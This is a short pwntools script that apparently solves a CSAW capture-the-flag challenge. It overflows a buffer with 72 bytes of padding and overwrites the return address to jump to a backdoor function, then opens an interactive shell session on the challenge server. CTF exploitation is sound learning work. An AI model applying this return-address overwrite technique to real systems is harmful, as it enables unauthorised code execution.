from pwn import *

r = remote("pwn.chal.csaw.io", 5000)

backdoor = 0x0000000000401172
payload = "a"*72 + p64(backdoor)
r.sendline(payload)

r.interactive()